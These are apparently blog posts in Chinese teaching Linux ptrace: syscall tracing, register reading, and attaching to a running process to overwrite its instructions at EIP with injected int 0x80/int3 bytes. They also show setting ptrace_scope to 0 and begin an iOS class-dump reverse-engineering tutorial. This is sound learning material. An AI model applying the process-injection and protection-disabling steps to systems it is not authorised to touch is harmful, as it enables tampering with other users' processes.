<p>这个例子其实是父进程<code>fork</code>出了一个子进程，然后跟踪它，在调用<code>exec</code>函数之前，子进程用PTRACE_TRACEME作为第一个参数调用了ptrace函数，意思就是告诉内核来跟踪我吧。然后在子进程调用了<code>exec</code>之后，它将控制权交还给父进程。当时的父进程正使用<code>wait()</code>函数等待来自内核的通知，得到了通知之后，他就可以去查看子进程干了什么事情，观察一下寄存器的值。</p>
<h1 id="0X01寄存器读写"><a href="#0X01寄存器读写" class="headerlink" title="0X01寄存器读写"></a>0X01寄存器读写</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid,</span></span></div><div class="line">                   <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data);</div></pre></td></tr></table></figure>
<p>根据man手册中的内容我们可以看到<code>ptrace</code>函数的定义以及需要引入的头文件，第一个参数就决定了<code>ptrace</code>的行为和其他的参数的使用方法，我通过头文件中的内容大概了解到这些枚举值的功能，至于头文件位置可以在通过<code>gcc</code>编译的时候查看相关的参数即可。在系统调用追踪时，常见的流程如下图所示：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/676200-20160220161141175-432928373.png" alt="676200-20160220161141175-432928373.png" title="" class="">
                <p>676200-20160220161141175-432928373.png</p>
            </figure>
<p>接下来我们就以write系统调用来看看是如何去肚脐寄存器的值的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;   /* For constants ORIG_EAX etc */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt; /* SYS_write */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">pid_t</span> child;</div><div class="line">    <span class="keyword">long</span> orig_eax;</div><div class="line">    <span class="keyword">int</span> status;</div><div class="line">    <span class="keyword">int</span> iscalling = <span class="number">0</span>;</div><div class="line">    <span class="keyword">struct</span> user_regs_struct regs;</div><div class="line"></div><div class="line">    child = fork();</div><div class="line">    <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;</div><div class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">        execl(<span class="string">"/bin/ls"</span>, <span class="string">"ls"</span>, <span class="string">"-l"</span>, <span class="string">"-h"</span>, <span class="literal">NULL</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">            wait(&amp;status);</div><div class="line">            <span class="keyword">if</span>(WIFEXITED(status))</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            orig_eax = ptrace(PTRACE_PEEKUSER,</div><div class="line">                              child, <span class="number">4</span> * ORIG_EAX,</div><div class="line">                              <span class="literal">NULL</span>);</div><div class="line">            <span class="keyword">if</span>(orig_eax == SYS_write) &#123;</div><div class="line">                ptrace(PTRACE_GETREGS, child, <span class="literal">NULL</span>, &amp;regs);</div><div class="line">                <span class="keyword">if</span>(!iscalling) &#123;</div><div class="line">                    iscalling = <span class="number">1</span>;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"SYS_write call with %ld, %ld, %ld\n"</span>,</div><div class="line">                            regs.edi, regs.esi, regs.edx);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"SYS_write call return %ld\n"</span>, regs.eax);</div><div class="line">                    iscalling = <span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译运行之后有如下输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">10</span></div><div class="line">total <span class="number">88</span>K</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">10</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">51</span></div><div class="line">-rwxrwxr-x <span class="number">1</span> ubuntu ubuntu <span class="number">7.4</span>K Dec <span class="number">15</span> <span class="number">11</span>:<span class="number">31</span> a.out</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">51</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">52</span></div><div class="line">-rw------- <span class="number">1</span> ubuntu ubuntu <span class="number">1.7</span>K Aug <span class="number">28</span> <span class="number">16</span>:<span class="number">15</span> id_rsa</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">52</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">56</span></div><div class="line">-rw-r--r-- <span class="number">1</span> ubuntu ubuntu  <span class="number">406</span> Aug <span class="number">28</span> <span class="number">13</span>:<span class="number">51</span> id_rsa.pub</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">56</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">52</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> ubuntu ubuntu  <span class="number">501</span> Dec <span class="number">15</span> <span class="number">10</span>:<span class="number">34</span> test.c</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">52</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">53</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> ubuntu ubuntu <span class="number">1.9</span>K Dec <span class="number">15</span> <span class="number">11</span>:<span class="number">16</span> test1.c</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">53</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">53</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> ubuntu ubuntu <span class="number">1.3</span>K Dec <span class="number">15</span> <span class="number">11</span>:<span class="number">31</span> test2.c</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">53</span></div><div class="line">SYS_write call with <span class="number">149205880</span>, <span class="number">-1217475232</span>, <span class="number">53</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> ubuntu ubuntu  <span class="number">54</span>K Dec <span class="number">15</span> <span class="number">10</span>:<span class="number">49</span> tmp.out</div><div class="line">SYS_write call <span class="keyword">return</span> <span class="number">53</span></div></pre></td></tr></table></figure>
<p>可以看到我们的<code>ls -l -h</code>命令中，发生了8次<code>write</code>系统调用，这里读取寄存器的时候可以使用之前的<code>PTRACE_PEEKUSER</code>，也可以直接使用<code>PTRACE_GETREGS</code>将寄存器的值读取到结构体<code>user_regs_struct</code>中，这个结构体的定义在<code>sys/user.h</code>中，下面贴一下在32的系统中的定义方式:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> user_regs_struct</div><div class="line">&#123;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> ebx;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> ecx;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> edx;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> esi;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> edi;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> ebp;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> eax;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> xds;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> xes;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> xfs;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> xgs;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> orig_eax;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> eip;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> xcs;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> eflags;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> esp;</div><div class="line">  <span class="keyword">long</span> <span class="keyword">int</span> xss;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>程序中的<code>WIFEXITED</code>宏是用来检查子进程是被<code>ptrace</code>暂停还是准备退出:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-15%20%E4%B8%8A%E5%8D%8811.57.17.png" alt="屏幕快照 2017-12-15 上午11.57.17.png" title="" class="">
                <p>屏幕快照 2017-12-15 上午11.57.17.png</p>
            </figure>
<p>另外还有一点就是<code>PTRACE_SYSCALL</code>参数，其作用就是使内核在子进程进入和退出系统系统调用的时候将其暂停，等价于<code>PTRACE_CONT</code>并且在下一个<code>entry/exit</code>系统调用之前暂停。</p>
<h1 id="0X02进程追踪"><a href="#0X02进程追踪" class="headerlink" title="0X02进程追踪"></a>0X02进程追踪</h1><p>上面的例子都是追踪并修改声明了<code>PTRACE_TRACEME</code>的子进程的，对于<code>ptrace</code>有了一个基本的了解之后接下来就可以看看追踪其他程序的进程，这个时候需要使用的就是<code>PTACRE_ATTACH</code>了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</div></pre></td></tr></table></figure>
<p>其中的pid号就是我们想要追踪的进程id号,当前进程会给被追踪进程发送<code>SIGSTOP</code>信号，但不要求立即停止，一般会等待子进程完成当前的调用，如果要结束追踪的话再调用<code>PTRACE_DETACH</code>即可，然后我们就可以通过ptrace来实现打断点的功能，但是首先这不是IDE，如果是QT的话是会有提示的，所以有些东西并不会报错，如果我们没有修改<code>ptrace</code>的配置文件，那么我们是无法达到预期效果也是不会报错的，所以首先第一件事情就是允许<code>ptrace</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo vim /etc/sysctl.d/10-ptrace.conf</div><div class="line">#修改kernel.yama.ptrace_scope的值为0</div></pre></td></tr></table></figure>
<p>接下来我们首先写一个循环打印的程序来看看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Hello, ptrace! [pid:%d]\n"</span>, getpid());</div><div class="line">        sleep(<span class="number">2</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序每隔两秒就会打印一个值到终端，接下来我们另外编写一个程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,</span></span></div><div class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> *laddr;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">union</span> u &#123;</div><div class="line">            <span class="keyword">long</span> val;</div><div class="line">            <span class="keyword">char</span> chars[long_size];</div><div class="line">    &#125;data;</div><div class="line"></div><div class="line">    i = <span class="number">0</span>;</div><div class="line">    j = len / long_size;</div><div class="line">    laddr = str;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</div><div class="line">        data.val = ptrace(PTRACE_PEEKDATA, child,</div><div class="line">                          addr + i * <span class="number">4</span>, <span class="literal">NULL</span>);</div><div class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, long_size);</div><div class="line">        ++i;</div><div class="line">        laddr += long_size;</div><div class="line">    &#125;</div><div class="line">    j = len % long_size;</div><div class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</div><div class="line">        data.val = ptrace(PTRACE_PEEKDATA, child,</div><div class="line">                          addr + i * <span class="number">4</span>, <span class="literal">NULL</span>);</div><div class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, j);</div><div class="line">    &#125;</div><div class="line">    str[len] = <span class="string">'\0'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,</span></span></div><div class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> *laddr;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">union</span> u &#123;</div><div class="line">            <span class="keyword">long</span> val;</div><div class="line">            <span class="keyword">char</span> chars[long_size];</div><div class="line">    &#125;data;</div><div class="line"></div><div class="line">    i = <span class="number">0</span>;</div><div class="line">    j = len / long_size;</div><div class="line">    laddr = str;</div><div class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</div><div class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</div><div class="line">        ptrace(PTRACE_POKEDATA, child,</div><div class="line">               addr + i * <span class="number">4</span>, data.val);</div><div class="line">        ++i;</div><div class="line">        laddr += long_size;</div><div class="line">    &#125;</div><div class="line">    j = len % long_size;</div><div class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</div><div class="line">        ptrace(PTRACE_POKEDATA, child,</div><div class="line">               addr + i * <span class="number">4</span>, data.val);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//attach.c</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s pid\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">pid_t</span> victim = atoi(argv[<span class="number">1</span>]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, victim);</div><div class="line">    <span class="keyword">struct</span> user_regs_struct regs;</div><div class="line">    <span class="comment">/* int 0x80, int3 */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> code[] = &#123;<span class="number">0xcd</span>,<span class="number">0x80</span>,<span class="number">0xcc</span>,<span class="number">0x00</span>&#125;;</div><div class="line">    <span class="keyword">char</span> backup[<span class="number">4</span>];</div><div class="line">    ptrace(PTRACE_ATTACH, victim, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">long</span> inst;</div><div class="line"></div><div class="line">    wait(<span class="literal">NULL</span>);</div><div class="line">    ptrace(PTRACE_GETREGS, victim, <span class="literal">NULL</span>, &amp;regs);</div><div class="line">    inst = ptrace(PTRACE_PEEKTEXT, victim, regs.eip, <span class="literal">NULL</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Victim: EIP:0x%lx INST: 0x%lx\n"</span>, regs.eip, inst);</div><div class="line"></div><div class="line">    <span class="comment">/* Copy instructions into a backup variable */</span></div><div class="line">    getdata(victim, regs.eip, backup, <span class="number">3</span>);</div><div class="line">    <span class="comment">/* Put the breakpoint */</span></div><div class="line">    putdata(victim, regs.eip, code, <span class="number">3</span>);</div><div class="line">    <span class="comment">/* Let the process continue and execute the int 3 instruction */</span></div><div class="line">    ptrace(PTRACE_CONT, victim, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    wait(<span class="literal">NULL</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Press Enter to continue ptraced process.\n"</span>);</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i &lt; <span class="number">4</span> ; i++)&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%c"</span>, backup[i]);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    putdata(victim, regs.eip, backup, <span class="number">3</span>);</div><div class="line">    ptrace(PTRACE_SETREGS, victim, <span class="literal">NULL</span>, &amp;regs);</div><div class="line"></div><div class="line">    ptrace(PTRACE_CONT, victim, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    ptrace(PTRACE_DETACH, victim, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面这段代码也就是在打印的那个程序运行的时候，通过它的pid号追踪这个程序，读取到它的指令寄存器的内容，备份之后换成我们的中断指令，按下回车之后再使其继续运行，这就是我们动态注入，这个程序我在32位的Ubuntu上运行成功了，但是中断之后再返回进程就会被杀死，返回给我一个<code>Segmentation fault (core dumped)</code>，暂时还没有解决，因为涉及到很多种情况，但是<code>ptrace</code>的这种动态追踪已经实现了，由于这次的注入代码长度只有四个字节，所以直接用<code>shell</code>注入的，实际上应该是在目标进程中动态加载库文件(.so)，就和我们的iOS程序需要动态加载(.dylib)一样。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-15%20%E4%B8%8B%E5%8D%884.26.49.png" alt="屏幕快照 2017-12-15 下午4.26.49.png" title="" class="">
                <p>屏幕快照 2017-12-15 下午4.26.49.png</p>
            </figure>
<p>至于ptrace是如何实现反动态调试和如果破解，下一次的博客再详细的说一下</p>
<h1 id="0X03参考博客"><a href="#0X03参考博客" class="headerlink" title="0X03参考博客"></a>0X03参考博客</h1><ul>
<li><a href="http://www.cnblogs.com/pannengzhi/p/5203467.html" target="_blank" rel="external">LinuxHook笔记</a></li>
<li><a href="http://blog.csdn.net/edonlii/article/details/8717029" target="_blank" rel="external">ptrace运行原理详解</a></li>
<li><a href="https://www.cnblogs.com/zlingh/p/4409002.html" target="_blank" rel="external">Linux进程状态</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> ptrace </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS逆向学习(二)]]></title>
      <url>/2017/12/11/iOS%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
      <content type="html"><![CDATA[<p>iOS逆向工程中使用的一系列工具功能不同，主要是作为开发和调试的工作，这一次主要是介绍两种：<code>class-dump</code>和<code>Theos</code>，那么这这个工具是干什么的呢？</p>
<a id="more"></a>
<h1 id="class-dump"><a href="#class-dump" class="headerlink" title="class-dump"></a>class-dump</h1><p>这个工具从名字中我们大概也能猜出来这是一个去dump目标对象的class信息的工具。它利用的是OC的<code>runtime</code>特性，将存储于Mach-O文件中的头文件信息（@interface和@protocol信息）提取出来，并生成的对应的.h文件。官方的介绍其实是这样说的：</p>
<blockquote>
<p>This is a command-line utility for examining the Objective-C runtime information stored in Mach-O files. It generates declarations for the classes, categories and protocols. This is the same information provided by using ‘otool -ov’, but presented as normal Objective-C declarations, so it is much more compact and readable</p>
</blockquote>
<p>这个工具的用法比较简单，首先去<a href="http://stevenygard.com/projects/class-dump/" target="_blank" rel="external">官网</a>下载一个镜像，然后将dmg中的class-dump复制到<code>/usr/bin</code>目录下，然后给它赋予777的权限，运行之后就可以看到它的相关参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">peterpan in ~ λ class-dump</div><div class="line">class-dump 3.5 (64 bit)</div><div class="line">Usage: class-dump [options] &lt;mach-o-file&gt;</div><div class="line"></div><div class="line">  where options are:</div><div class="line">        -a             show instance variable offsets</div><div class="line">        -A             show implementation addresses</div><div class="line">        --arch &lt;arch&gt;  choose a specific architecture from a universal binary (ppc, ppc64, i386, x86_64, armv6, armv7, armv7s, arm64)</div><div class="line">        -C &lt;regex&gt;     only display classes matching regular expression</div><div class="line">        -f &lt;str&gt;       find string in method name</div><div class="line">        -H             generate header files in current directory, or directory specified with -o</div><div class="line">        -I             sort classes, categories, and protocols by inheritance (overrides -s)</div><div class="line">        -o &lt;dir&gt;       output directory used for -H</div><div class="line">        -r             recursively expand frameworks and fixed VM shared libraries</div><div class="line">        -s             sort classes and categories by name</div><div class="line">        -S             sort methods by name</div><div class="line">        -t             suppress header in output, for testing</div><div class="line">        --list-arches  list the arches in the file, then exit</div><div class="line">        --sdk-ios      specify iOS SDK version (will look in /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS&lt;version&gt;.sdk</div><div class="line">        --sdk-mac      specify Mac OS X version (will look in /Developer/SDKs/MacOSX&lt;version&gt;.sdk</div><div class="line">        --sdk-root     specify the full SDK root path (or use --sdk-ios/--sdk-mac for a shortcut)</div></pre></td></tr></table></figure>
<p>class-dump的对象是Mach-O格式的二进制文件，如Framwwork的库文件和App的可执行文件。下面用Mac上的一个ShadowsocksX为例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">peterpan in ~ λ cd /Applications/ShadowsocksX.app/</div><div class="line">peterpan in /Applications/ShadowsocksX.app λ ls</div><div class="line">Contents</div><div class="line">peterpan in /Applications/ShadowsocksX.app λ cd Contents</div><div class="line">peterpan in /Applications/ShadowsocksX.app/Contents λ ls</div><div class="line">Info.plist     MacOS          PkgInfo        Resources      _CodeSignature</div><div class="line">peterpan in /Applications/ShadowsocksX.app/Contents λ plutil -p Info.plist | grep CFBundleExecutable</div><div class="line">  &quot;CFBundleExecutable&quot; =&gt; &quot;ShadowsocksX&quot;</div></pre></td></tr></table></figure>
<p>这个时候我们已经通过Xcode的命令行工具plutil找到了这个App的可执行文件，但是并没有在本目录下找到，而是在其中一个子目录下面，接下来我们就可以使用class-dump去提取App的头文件了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class-dump -s -S -H ShadowsocksX -o ~/path/to/headers/ShadowsocksX</div></pre></td></tr></table></figure>
